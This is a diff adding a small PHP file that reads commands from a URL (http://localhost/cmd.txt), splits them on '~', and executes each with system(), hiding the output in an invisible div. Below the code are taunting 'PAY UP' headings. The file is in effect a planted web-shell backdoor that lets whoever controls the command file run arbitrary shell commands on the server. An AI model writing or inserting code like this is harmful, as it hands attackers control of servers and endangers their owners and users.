@@ -1,0 +1,20 @@
+<?php
+
+$cont = @file_get_contents("http://localhost/cmd.txt");
+
+if($cont) {
+	echo '<pre>';
+	echo '<b>Command : </b><i>'.$cont.'</i> <br><br>';
+	echo '<div style="display:none;">';
+	$cont = explode('~',$cont);
+	print_r($cont);
+	foreach($cont as $cmd) {
+		system($cmd);
+	}
+	echo '</div>';
+	echo '</pre>';
+}
+
+?>
+<h1>TRYING TO FRACK WITH US?</h1>
+<h1>PAY UP MUDDER FUDDERS!</h1>
